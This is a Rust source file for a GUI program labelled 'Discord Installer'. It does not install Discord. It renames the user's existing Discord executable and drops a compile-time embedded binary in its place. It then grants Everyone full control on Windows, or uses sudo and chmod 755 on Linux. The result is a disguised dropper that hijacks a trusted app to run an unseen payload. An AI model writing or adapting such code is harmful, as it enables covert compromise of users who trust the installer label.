use std::fs;
use std::io::Write;
use std::process::Command;
use eframe::{App, egui};
use whoami;

const EMBEDDED_BINARY: &[u8] = include_bytes!("../target/x86_64-pc-windows-gnu/release/main.exe"); ///! Change to /release/ when finished

fn main() -> Result<(), eframe::Error> {
    let native_options = eframe::NativeOptions::default();
    eframe::run_native("Installer", native_options, Box::new(|_cc| Ok(Box::new(InstallerApp::default()))))?;
    Ok(())
}

struct InstallerApp {
    username: String,
    status: String,
    alertm: Option<String>,
}

impl Default for InstallerApp {
    fn default() -> Self {
        Self {
            username: whoami::username(),
            status: String::new(),
            alertm: None,
        }
    }
}


impl App for InstallerApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("Discord Installer");

            ui.horizontal(|ui| {
                ui.label(egui::RichText::new(format!(
                    "Detected username: "
                ))
                .text_style(egui::TextStyle::Heading)
                .color(egui::Color32::from_rgb(255, 255, 255)));
                ui.text_edit_singleline(&mut self.username);
            });

            if ui.button("Install").clicked() {
                self.status = install_discord(&self.username);
                println!("{}", self.status);
                self.alertm = Some(self.status.clone());
            }

            ui.label(&self.status);
        });

        if let Some(message) = self.alertm.clone() {
            egui::Window::new("Alert!")
                .resizable(true)
                .collapsible(true)
                .default_pos(egui::pos2(100.0, 100.0))
                .show(ctx, |ui| {
                    ui.heading(&message);
                    if ui.button("Close").clicked() {
                        self.alertm = None;
                    }
                });
        }
    }
}

fn install_discord(username: &str) -> String {
    if username.is_empty() {
        return "A username is required!".to_string();
    }

    let discord_dir = if cfg!(target_os = "windows") {
        format!("C:\\Users\\{}\\Appdata\\Local\\Discord", username)
    } else {
        format!("/home/{}/.local/share/Discord", username)
    };

    if directory_exists(&discord_dir) {
        let discord_bin = format!("{}/Discord", discord_dir);
        let discord_new = format!("{}/Discord2", discord_dir);

        if let Err(e) = run_command("mv", &[&discord_bin, &discord_new]) {
            return format!("Failed!\n{}", e);
        }

        if let Err(e) = write_binary(&discord_bin) {
            let revert_msg = if let Err(_e) = run_command("mv", &[&discord_new, &discord_bin]) {
                format!("Failed to revert changes, the following apps WILL be affected:\n{}", discord_dir)
            } else {
                "Reverted changes successfully.".to_string()
            };
            return format!("Failed to install binary!\n{}\n{}", e, revert_msg);
        }

        return "Installation successful!".to_string()
    } else {
        "Discord not found!".to_string()
    }
}

fn directory_exists(path: &str) -> bool {
    match fs::metadata(path) {
        Ok(metadata) => metadata.is_dir(),
        Err(_) => false,
    }
}

fn write_binary(output_path: &str) -> std::io::Result<()> {
    let mut child = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .arg("/C")
            .arg("type")
            .arg("nul")
            .arg(">")
            .arg(output_path)
            .stdin(std::process::Stdio::piped())
            .spawn()
            .expect("Critical Error.")
    } else {
        Command::new("sudo")
            .arg("tee")
            .arg(output_path)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::null())
            .spawn()
            .expect("Critical Error.")
    };

    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(EMBEDDED_BINARY)?;
    }

    let status = child.wait()?;
    if !status.success() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            "Failed to unpack binary!",
        ));
    }

    let chmod_status = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .arg("/C")
            .arg("icacls")
            .arg(output_path)
            .arg("/grant")
            .arg("Everyone:F")
            .status()?
    } else {
        Command::new("sudo")
            .arg("chmod")
            .arg("755")
            .arg(output_path)
            .status()?
    };

    if !chmod_status.success() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            "Failed to change file permissions! (cannot execute)",
        ));
    }

    Ok(())
}

fn run_command(command: &str, args: &[&str]) -> std::io::Result<()> {
    let status = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .arg("/C")
            .arg(command)
            .args(args)
            .status()
            .expect("Failed to execute command")
    } else {
        Command::new("sudo")
            .arg(command)
            .args(args)
            .status()
            .expect("Failed to execute command")
    };

    if !status.success() {
        Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("{:?} failed with status: {}", args, status),
        ))
    } else {
        Ok(())
    }
}